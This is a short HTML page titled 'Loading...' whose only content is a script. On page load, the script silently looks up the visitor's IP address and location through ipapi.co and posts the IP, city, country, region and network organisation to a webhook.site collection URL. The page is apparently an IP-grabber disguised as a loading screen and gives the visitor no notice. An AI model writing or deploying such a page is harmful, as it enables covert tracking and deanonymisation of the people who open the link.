<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
</head>
<body>
<script>
fetch('https://ipapi.co/json/')
  .then(r => r.json())
  .then(d => {
    fetch('https://webhook.site/c9cf62fb-1ce1-453d-96b2-7a529baa48fd', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        ip: d.ip,
        city: d.city,
        country: d.country_name,
        region: d.region,
        org: d.org
      })
    });
  });
</script>
</body>
</html>
